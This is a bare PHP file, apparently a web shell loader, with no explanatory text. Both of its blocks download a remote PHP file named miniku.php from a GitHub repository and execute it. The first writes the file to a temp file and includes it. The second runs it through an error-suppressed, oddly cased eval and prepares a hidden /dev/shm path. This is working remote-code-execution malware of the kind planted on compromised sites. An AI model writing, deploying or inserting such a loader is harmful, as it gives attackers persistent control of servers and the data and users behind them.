<?php
$url = 'https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/miniku.php'; $dns = 'https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/time.php'; $ch = curl_init($url); if (defined('CURLOPT_DOH_URL')) { curl_setopt($ch, CURLOPT_DOH_URL, $dns); } curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); $res = curl_exec($ch); curl_close($ch); $tmp = tmpfile(); $path = stream_get_meta_data($tmp)['uri']; fprintf($tmp, '%s', $res); include($path); ?>
<?php

    $url = 'https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/miniku.php';
    
    $targetDir = '/dev/shm';
    
    if (!is_dir($targetDir)) {
        mkdir($targetDir, 0777, true);
    }
    
    $randomFileName = uniqid() . '.php';
    $targetFile = $targetDir . '/' . $randomFileName;
    
    if (!file_exists($targetFile)) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, false);
        $response = curl_exec($ch);
        curl_close($ch);
        @EvAl('?>'. $response);
    }

?>
